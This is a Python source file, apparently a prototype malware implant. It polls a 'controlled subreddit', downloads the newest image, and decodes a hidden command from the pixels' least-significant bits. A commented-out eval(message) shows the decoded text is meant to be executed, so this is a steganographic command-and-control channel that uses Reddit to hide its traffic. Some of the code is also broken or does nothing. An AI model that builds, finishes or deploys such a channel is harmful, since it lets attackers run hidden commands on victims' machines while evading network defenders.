import requests
from bs4 import BeautifulSoup
import re
from PIL import Image
import numpy as np
import random
import string
from urllib.parse import urlparse

def retrieve_message(image_path):
    with Image.open(image_path) as img:
        img.convert("RGB")

        width,height = img.size
        data = np.array(img)
    # flatten data
    data_shape = data.shape
    #data = np.reshape(data, width*height*3)
    data = data.flatten()
    data = data.reshape(data_shape)

    # collects last bit
    data = data & 1
    data = np.packbits(data)

    #contenrts intreger to unicode
    message = ""
    for x in data:
        l = chr(x)
        if not l.isprintable():
            break
        message += l
    #eval(message)
    return message


def save_image(url, save_folder):
    # gets image
    r = requests.get(url)
    if r.status_code == 200:
        #saves in the specified folder
        filename = f"{save_folder}{"".join(random.choices(string.ascii_letters, k=10))}.png"
        with open(filename, "wb") as img:
            img.write(r.content)
        print("saved image")
        return filename


def get_latest_command(subreddit):
    #gets page contents and creates a bs4 soup
    r = requests.get(f"https://www.reddit.com/r/{subreddit}/")
    soup = BeautifulSoup(r.text, "html.parser")
    
    # tries to find post elements
    posts_pattern = re.compile('https://preview.redd.it/*.')
    latest_image_url = soup.find_all("img", {"src": posts_pattern})[1:][0]["src"]

    # download and save image
    file_path = save_image(latest_image_url, "/tmp/")
    if file_path:
        message = retrieve_message(file_path)
    else:
        print("failed to save image somewhere")

    print(message)

# takes in controlled subreddit as a parameter
#get_latest_command("houghton_regis")
#print(retrieve_message("emvoEubvcg.png"))
save_image("https://preview.redd.it/forest-but-better-v0-lbftfq9c19we1.png?width=640&crop=smart&auto=webp&s=272647fa7b947062c4d9608eea27450df5382f8e", "./")